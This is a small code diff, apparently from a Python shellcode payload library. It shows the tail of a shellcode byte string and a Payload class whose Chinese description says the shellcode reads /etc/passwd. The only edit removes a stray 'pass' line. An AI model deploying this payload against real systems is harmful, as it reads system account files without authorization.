@@ -32,7 +32,6 @@ shellcode +="\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65"
 shellcode +="\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
 class Payload(object):
     def __init__(self):
-        pass
         self.info = '这段shellcode的作用是读出/etc/passwd的内容'
         self.data = shellcode
 
